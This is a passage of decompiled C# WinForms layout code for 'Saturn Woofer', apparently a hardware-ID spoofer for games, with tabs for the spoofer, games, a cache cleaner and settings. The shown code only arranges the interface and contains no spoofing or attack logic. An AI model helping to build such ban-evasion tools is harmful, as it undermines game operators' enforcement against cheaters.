      ((Control) this.siticoneLabel1).Text = "Cache Cleaner";
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.pictureBox2, (DecorationType) 0);
      this.pictureBox2.Image = (Image) Resources.game;
      this.pictureBox2.Location = new Point(11, 10);
      this.pictureBox2.Name = "pictureBox2";
      this.pictureBox2.Size = new Size(46, 35);
      this.pictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
      this.pictureBox2.TabIndex = 25;
      this.pictureBox2.TabStop = false;
      this.label3.AutoSize = true;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.label3, (DecorationType) 0);
      this.label3.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
      this.label3.ForeColor = System.Drawing.Color.White;
      this.label3.Location = new Point(60, 6);
      this.label3.Name = "label3";
      this.label3.Size = new Size(93, 32);
      this.label3.TabIndex = 9;
      this.label3.Text = "Games";
      ((Control) this.settingspanel).BackColor = System.Drawing.Color.Transparent;
      ((Control) this.settingspanel).Controls.Add((Control) this.siticoneLabel14);
      ((Control) this.settingspanel).Controls.Add((Control) this.siticoneLabel6);
      ((Control) this.settingspanel).Controls.Add((Control) this.siticoneButton1);
      ((Control) this.settingspanel).Controls.Add((Control) this.siticoneLabel10);
      ((Control) this.settingspanel).Controls.Add((Control) this.diskname);
      ((Control) this.settingspanel).Controls.Add((Control) this.siticoneButton2);
      ((Control) this.settingspanel).Controls.Add((Control) this.siticoneLabel7);
      ((Control) this.settingspanel).Controls.Add((Control) this.pictureBox3);
      ((Control) this.settingspanel).Controls.Add((Control) this.label4);
      ((Control) this.settingspanel).Controls.Add((Control) this.siticoneLabel3);
      ((Control) this.settingspanel).Controls.Add((Control) this.version);
      ((Control) this.settingspanel).Controls.Add((Control) this.DiscordRPCTS);
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.settingspanel, (DecorationType) 0);
      this.settingspanel.FillColor = System.Drawing.Color.Black;
      ((Control) this.settingspanel).ForeColor = System.Drawing.Color.FromArgb(47, 48, 51);
      ((Control) this.settingspanel).Location = new Point(11, 93);
      ((Control) this.settingspanel).Name = "settingspanel";
      this.settingspanel.ShadowColor = System.Drawing.Color.Black;
      ((Control) this.settingspanel).Size = new Size(455, 311);
      ((Control) this.settingspanel).TabIndex = 72;
      ((Control) this.settingspanel).Paint += new PaintEventHandler(this.settingspanel_Paint_2);
      ((Control) this.siticoneLabel14).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel14, (DecorationType) 0);
      this.siticoneLabel14.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.siticoneLabel14.ForeColor = System.Drawing.Color.White;
      ((Control) this.siticoneLabel14).Location = new Point(217, 291);
      ((Control) this.siticoneLabel14).Margin = new Padding(2);
      ((Control) this.siticoneLabel14).Name = "siticoneLabel14";
      ((Control) this.siticoneLabel14).Size = new Size(80, 15);
      ((Control) this.siticoneLabel14).TabIndex = 76;
      ((Control) this.siticoneLabel14).Text = "|  Status: Public";
      ((Control) this.siticoneLabel6).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel6, (DecorationType) 0);
      this.siticoneLabel6.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.siticoneLabel6.ForeColor = System.Drawing.Color.Black;
      ((Control) this.siticoneLabel6).Location = new Point(216, 291);
      ((Control) this.siticoneLabel6).Margin = new Padding(2);
      ((Control) this.siticoneLabel6).Name = "siticoneLabel6";
      ((Control) this.siticoneLabel6).Size = new Size(7, 15);
      ((Control) this.siticoneLabel6).TabIndex = 75;
      ((Control) this.siticoneLabel6).Text = "|";
      this.siticoneButton1.BorderColor = System.Drawing.Color.DimGray;
      this.siticoneButton1.BorderRadius = 4;
      this.siticoneButton1.BorderThickness = 2;
      this.siticoneButton1.CheckedState.Parent = (CustomButtonBase) this.siticoneButton1;
      this.siticoneButton1.CustomImages.Parent = (CustomButtonBase) this.siticoneButton1;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneButton1, (DecorationType) 0);
      this.siticoneButton1.FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneButton1).Font = new Font("Segoe UI Black", 9f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      ((Control) this.siticoneButton1).ForeColor = System.Drawing.Color.White;
      this.siticoneButton1.HoveredState.Parent = (CustomButtonBase) this.siticoneButton1;
      ((Control) this.siticoneButton1).Location = new Point(16, 155);
      ((Control) this.siticoneButton1).Name = "siticoneButton1";
      this.siticoneButton1.PressedColor = System.Drawing.Color.DarkRed;
      this.siticoneButton1.ShadowDecoration.Parent = (Control) this.siticoneButton1;
      ((Control) this.siticoneButton1).Size = new Size(117, 32);
      ((Control) this.siticoneButton1).TabIndex = 74;
      ((Control) this.siticoneButton1).Text = "Reset User Photo";
      ((Control) this.siticoneButton1).Click += new EventHandler(this.siticoneButton1_Click_2);
      ((Control) this.siticoneLabel10).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel10, (DecorationType) 0);
      this.siticoneLabel10.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, (byte) 161);
      this.siticoneLabel10.ForeColor = System.Drawing.Color.DimGray;
      ((Control) this.siticoneLabel10).Location = new Point(23, 202);
      ((Control) this.siticoneLabel10).Margin = new Padding(2);
      ((Control) this.siticoneLabel10).Name = "siticoneLabel10";
      ((Control) this.siticoneLabel10).Size = new Size(66, 17);
      ((Control) this.siticoneLabel10).TabIndex = 73;
      ((Control) this.siticoneLabel10).Text = "Disk Name: ";
      this.diskname.BorderColor = System.Drawing.Color.WhiteSmoke;
      this.diskname.BorderRadius = 3;
      ((Control) this.diskname).Cursor = Cursors.IBeam;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.diskname, (DecorationType) 0);
      ((TextBox) this.diskname).DefaultText = "C";
      this.diskname.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
      this.diskname.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
      this.diskname.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
      this.diskname.DisabledState.Parent = (TextBox) this.diskname;
      this.diskname.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
      this.diskname.FillColor = System.Drawing.Color.Black;
      this.diskname.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.diskname.FocusedState.Parent = (TextBox) this.diskname;
      ((TextBox) this.diskname).ForeColor = System.Drawing.Color.White;
      this.diskname.HoveredState.BorderColor = System.Drawing.Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.diskname.HoveredState.Parent = (TextBox) this.diskname;
      ((Control) this.diskname).Location = new Point(93, 197);
      ((Control) this.diskname).Margin = new Padding(4);
      ((Control) this.diskname).Name = "diskname";
      ((TextBox) this.diskname).PasswordChar = char.MinValue;
      this.diskname.PlaceholderText = "";
      ((TextBox) this.diskname).SelectedText = "";
      this.diskname.ShadowDecoration.Parent = (Control) this.diskname;
      ((Control) this.diskname).Size = new Size(26, 28);
      ((Control) this.diskname).TabIndex = 72;
      ((TextBox) this.diskname).TextAlign = HorizontalAlignment.Center;
      this.siticoneButton2.BorderColor = System.Drawing.Color.DimGray;
      this.siticoneButton2.BorderRadius = 4;
      this.siticoneButton2.BorderThickness = 2;
      this.siticoneButton2.CheckedState.Parent = (CustomButtonBase) this.siticoneButton2;
      this.siticoneButton2.CustomImages.Parent = (CustomButtonBase) this.siticoneButton2;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneButton2, (DecorationType) 0);
      this.siticoneButton2.FillColor = System.Drawing.Color.Black;
      ((Control) this.siticoneButton2).Font = new Font("Segoe UI Black", 9f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      ((Control) this.siticoneButton2).ForeColor = System.Drawing.Color.White;
      this.siticoneButton2.HoveredState.Parent = (CustomButtonBase) this.siticoneButton2;
      ((Control) this.siticoneButton2).Location = new Point(16, 116);
      ((Control) this.siticoneButton2).Name = "siticoneButton2";
      this.siticoneButton2.PressedColor = System.Drawing.Color.DarkRed;
      this.siticoneButton2.ShadowDecoration.Parent = (Control) this.siticoneButton2;
      ((Control) this.siticoneButton2).Size = new Size(117, 32);
      ((Control) this.siticoneButton2).TabIndex = 71;
      ((Control) this.siticoneButton2).Text = "Delete Credentials";
      ((Control) this.siticoneButton2).Click += new EventHandler(this.siticoneButton2_Click);
      ((Control) this.siticoneLabel7).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel7, (DecorationType) 0);
      this.siticoneLabel7.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.siticoneLabel7.ForeColor = System.Drawing.Color.Black;
      ((Control) this.siticoneLabel7).Location = new Point(65, 34);
      ((Control) this.siticoneLabel7).Margin = new Padding(2);
      ((Control) this.siticoneLabel7).Name = "siticoneLabel7";
      ((Control) this.siticoneLabel7).Size = new Size(101, 15);
      ((Control) this.siticoneLabel7).TabIndex = 62;
      ((Control) this.siticoneLabel7).Text = "Customize Spoofer";
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.pictureBox3, (DecorationType) 0);
      this.pictureBox3.Image = (Image) Resources.kindpng_3933927;
      this.pictureBox3.Location = new Point(11, 10);
      this.pictureBox3.Name = "pictureBox3";
      this.pictureBox3.Size = new Size(46, 35);
      this.pictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
      this.pictureBox3.TabIndex = 25;
      this.pictureBox3.TabStop = false;
      this.label4.AutoSize = true;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.label4, (DecorationType) 0);
      this.label4.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
      this.label4.ForeColor = System.Drawing.Color.White;
      this.label4.Location = new Point(60, 3);
      this.label4.Name = "label4";
      this.label4.Size = new Size(111, 32);
      this.label4.TabIndex = 9;
      this.label4.Text = "Settings";
      this.label7.AutoSize = true;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.label7, (DecorationType) 0);
      this.label7.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label7.ForeColor = System.Drawing.Color.White;
      this.label7.Location = new Point(116, 7);
      this.label7.Margin = new Padding(2, 0, 2, 0);
      this.label7.Name = "label7";
      this.label7.Size = new Size(13, 19);
      this.label7.TabIndex = 74;
      this.label7.Text = "|";
      this.time.AutoSize = true;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.time, (DecorationType) 0);
      this.time.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.time.ForeColor = System.Drawing.Color.White;
      this.time.Location = new Point(129, 8);
      this.time.Margin = new Padding(2, 0, 2, 0);
      this.time.Name = "time";
      this.time.Size = new Size(71, 19);
      this.time.TabIndex = 75;
      this.time.Text = "0:00:0000";
      ((Control) this.siticoneLabel8).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel8, (DecorationType) 0);
      this.siticoneLabel8.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 161);
      this.siticoneLabel8.ForeColor = System.Drawing.Color.White;
      ((Control) this.siticoneLabel8).Location = new Point(179, 405);
      ((Control) this.siticoneLabel8).Margin = new Padding(2);
      ((Control) this.siticoneLabel8).Name = "siticoneLabel8";
      ((Control) this.siticoneLabel8).Size = new Size(105, 17);
      ((Control) this.siticoneLabel8).TabIndex = 40;
      ((Control) this.siticoneLabel8).Text = "discord.gg/spoofer";
      ((Control) this.siticoneLabel8).Click += new EventHandler(this.siticoneLabel8_Click);
      ((Control) this.defpanel).BackColor = System.Drawing.Color.Transparent;
      ((Control) this.defpanel).Controls.Add((Control) this.siticoneLabel9);
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.defpanel, (DecorationType) 0);
      this.defpanel.FillColor = System.Drawing.Color.Black;
      ((Control) this.defpanel).Location = new Point(11, 93);
      ((Control) this.defpanel).Name = "defpanel";
      this.defpanel.ShadowColor = System.Drawing.Color.Black;
      ((Control) this.defpanel).Size = new Size(455, 311);
      ((Control) this.defpanel).TabIndex = 73;
      ((Control) this.defpanel).Paint += new PaintEventHandler(this.premiumpanel_Paint);
      ((Control) this.siticoneLabel9).BackColor = System.Drawing.Color.Transparent;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneLabel9, (DecorationType) 0);
      this.siticoneLabel9.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.siticoneLabel9.ForeColor = System.Drawing.Color.White;
      ((Control) this.siticoneLabel9).Location = new Point(85, 143);
      ((Control) this.siticoneLabel9).Margin = new Padding(2);
      ((Control) this.siticoneLabel9).Name = "siticoneLabel9";
      ((Control) this.siticoneLabel9).Size = new Size(271, 15);
      ((Control) this.siticoneLabel9).TabIndex = 74;
      ((Control) this.siticoneLabel9).Text = "Welcome to Saturn Woofer, Select a tab to navigate";
      ((Control) this.siticoneGradientButton3).BackColor = System.Drawing.Color.Black;
      ((ButtonState) this.siticoneGradientButton3.CheckedState).Parent = (CustomButtonBase) this.siticoneGradientButton3;
      this.siticoneGradientButton3.CustomImages.Parent = (CustomButtonBase) this.siticoneGradientButton3;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneGradientButton3, (DecorationType) 0);
      this.siticoneGradientButton3.FillColor = System.Drawing.Color.Transparent;
      this.siticoneGradientButton3.FillColor2 = System.Drawing.Color.Transparent;
      ((Control) this.siticoneGradientButton3).Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
      ((Control) this.siticoneGradientButton3).ForeColor = System.Drawing.Color.White;
      ((ButtonState) this.siticoneGradientButton3.HoveredState).Parent = (CustomButtonBase) this.siticoneGradientButton3;
      this.siticoneGradientButton3.Image = (Image) Resources.game;
      ((Control) this.siticoneGradientButton3).Location = new Point(283, 36);
      ((Control) this.siticoneGradientButton3).Name = "siticoneGradientButton3";
      this.siticoneGradientButton3.PressedColor = System.Drawing.Color.DarkRed;
      this.siticoneGradientButton3.ShadowDecoration.Parent = (Control) this.siticoneGradientButton3;
      ((Control) this.siticoneGradientButton3).Size = new Size(90, 51);
      ((Control) this.siticoneGradientButton3).TabIndex = 72;
      ((Control) this.siticoneGradientButton3).Click += new EventHandler(this.siticoneGradientButton3_Click_1);
      ((Control) this.siticoneGradientButton2).BackColor = System.Drawing.Color.Black;
      ((ButtonState) this.siticoneGradientButton2.CheckedState).Parent = (CustomButtonBase) this.siticoneGradientButton2;
      this.siticoneGradientButton2.CustomImages.Parent = (CustomButtonBase) this.siticoneGradientButton2;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneGradientButton2, (DecorationType) 0);
      this.siticoneGradientButton2.FillColor = System.Drawing.Color.Transparent;
      this.siticoneGradientButton2.FillColor2 = System.Drawing.Color.Transparent;
      ((Control) this.siticoneGradientButton2).Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
      ((Control) this.siticoneGradientButton2).ForeColor = System.Drawing.Color.White;
      ((ButtonState) this.siticoneGradientButton2.HoveredState).Parent = (CustomButtonBase) this.siticoneGradientButton2;
      this.siticoneGradientButton2.Image = (Image) Resources.pngaaa_com_3790696;
      ((Control) this.siticoneGradientButton2).Location = new Point(190, 36);
      ((Control) this.siticoneGradientButton2).Name = "siticoneGradientButton2";
      this.siticoneGradientButton2.PressedColor = System.Drawing.Color.DarkRed;
      this.siticoneGradientButton2.ShadowDecoration.Parent = (Control) this.siticoneGradientButton2;
      ((Control) this.siticoneGradientButton2).Size = new Size(90, 51);
      ((Control) this.siticoneGradientButton2).TabIndex = 71;
      ((Control) this.siticoneGradientButton2).Click += new EventHandler(this.siticoneGradientButton2_Click_1);
      ((Control) this.siticoneGradientButton4).BackColor = System.Drawing.Color.Black;
      ((ButtonState) this.siticoneGradientButton4.CheckedState).Parent = (CustomButtonBase) this.siticoneGradientButton4;
      this.siticoneGradientButton4.CustomImages.Parent = (CustomButtonBase) this.siticoneGradientButton4;
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this.siticoneGradientButton4, (DecorationType) 0);
      this.siticoneGradientButton4.FillColor = System.Drawing.Color.Transparent;
      this.siticoneGradientButton4.FillColor2 = System.Drawing.Color.Transparent;
      ((Control) this.siticoneGradientButton4).Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
      ((Control) this.siticoneGradientButton4).ForeColor = System.Drawing.Color.White;
      ((ButtonState) this.siticoneGradientButton4.HoveredState).Parent = (CustomButtonBase) this.siticoneGradientButton4;
      this.siticoneGradientButton4.Image = (Image) Resources.kindpng_3933927;
      ((Control) this.siticoneGradientButton4).Location = new Point(376, 36);
      ((Control) this.siticoneGradientButton4).Name = "siticoneGradientButton4";
      this.siticoneGradientButton4.PressedColor = System.Drawing.Color.DarkRed;
      this.siticoneGradientButton4.ShadowDecoration.Parent = (Control) this.siticoneGradientButton4;
      ((Control) this.siticoneGradientButton4).Size = new Size(90, 51);
      ((Control) this.siticoneGradientButton4).TabIndex = 70;
      ((Control) this.siticoneGradientButton4).Click += new EventHandler(this.siticoneGradientButton4_Click_1);
      this.timer1.Enabled = true;
      this.timer1.Interval = 1;
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.AutoValidate = AutoValidate.Disable;
      this.BackColor = System.Drawing.Color.Black;
      this.ClientSize = new Size(471, 423);
      this.Controls.Add((Control) this.siticoneLabel8);
      this.Controls.Add((Control) this.time);
      this.Controls.Add((Control) this.label7);
      this.Controls.Add((Control) this.siticoneGradientButton3);
      this.Controls.Add((Control) this.siticoneGradientButton2);
      this.Controls.Add((Control) this.siticoneGradientButton4);
      this.Controls.Add((Control) this.panel2);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.siticoneControlBox2);
      this.Controls.Add((Control) this.siticoneControlBox1);
      this.Controls.Add((Control) this.spooferpanel);
      this.Controls.Add((Control) this.settingspanel);
      this.Controls.Add((Control) this.gamepanel);
      this.Controls.Add((Control) this.defpanel);
      ((Animator) this.siticoneTransition1).SetDecoration((Control) this, (DecorationType) 1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Main);
      this.Opacity = 0.85;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Saturn Woofer";
      this.TransparencyKey = System.Drawing.Color.Maroon;
      this.Load += new EventHandler(this.Main_Load);
      this.panel2.ResumeLayout(false);
      this.panel2.PerformLayout();
      ((ISupportInitialize) this.pictureBox1).EndInit();
      ((Control) this.spooferpanel).ResumeLayout(false);
      ((Control) this.spooferpanel).PerformLayout();
      ((ISupportInitialize) this.pictureBox4).EndInit();
      ((Control) this.gamepanel).ResumeLayout(false);
      ((Control) this.gamepanel).PerformLayout();
      ((ISupportInitialize) this.pictureBox2).EndInit();
      ((Control) this.settingspanel).ResumeLayout(false);
      ((Control) this.settingspanel).PerformLayout();
      ((ISupportInitialize) this.pictureBox3).EndInit();
      ((Control) this.defpanel).ResumeLayout(false);
      ((Control) this.defpanel).PerformLayout();
      ((ISupportInitialize) this.bindingSource1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
